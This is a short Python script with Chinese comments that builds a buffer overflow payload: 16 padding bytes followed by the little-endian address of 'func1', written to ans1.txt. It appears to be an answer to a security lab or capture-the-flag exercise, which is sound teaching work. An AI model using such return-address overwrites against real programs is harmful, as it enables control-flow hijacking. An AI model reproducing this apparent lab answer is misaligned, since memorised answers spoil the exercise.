padding = b"A" * 16  # 覆盖到返回地址前

# func1地址: 0x401216 (小端序，64位是8字节)
# x86-64是小端，最低有效字节在前
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 0x401216

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans1.txt")
print("Length:", len(payload), "bytes")
print("Target address:", "0x401216 (func1)")